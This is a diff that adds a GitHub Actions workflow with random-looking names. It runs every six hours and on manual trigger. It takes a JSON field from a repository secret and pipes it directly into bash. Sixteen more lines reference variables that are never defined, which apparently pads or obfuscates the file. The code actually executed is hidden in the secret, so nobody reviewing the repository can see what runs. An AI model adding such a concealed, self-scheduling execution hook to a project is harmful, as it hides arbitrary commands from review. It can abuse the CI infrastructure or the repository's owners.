@@ -1,0 +1,34 @@
+name: chkokkl
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chkokkl
+        env:
+          v84: ${{ secrets.v84 }}
+        run: |
+          echo $v84 | jq -r .vli900 | /bin/bash
+          echo $vc873 | jq -r .or6721 | /bin/bash
+          echo $kosqt25086 | jq -r .itrnr517 | /bin/bash
+          echo $xg16 | jq -r .mgsli65 | /bin/bash
+          echo $vk90 | jq -r .f271 | /bin/bash
+          echo $wyaj3468 | jq -r .lwjcc4 | /bin/bash
+          echo $wnlft5679 | jq -r .bvxd67772 | /bin/bash
+          echo $hspvq7 | jq -r .vsist469 | /bin/bash
+          echo $vkpri70187 | jq -r .yl96 | /bin/bash
+          echo $uh52265 | jq -r .gunf27 | /bin/bash
+          echo $hif50370 | jq -r .ihplg590 | /bin/bash
+          echo $yutw2957 | jq -r .q45349 | /bin/bash
+          echo $zhkgu92 | jq -r .dfx0523 | /bin/bash
+          echo $tibf311 | jq -r .s6 | /bin/bash
+          echo $leuc94661 | jq -r .alwc4 | /bin/bash
+          echo $ft87976 | jq -r .u25 | /bin/bash
+          echo $yarfx48450 | jq -r .eri9805 | /bin/bash
+
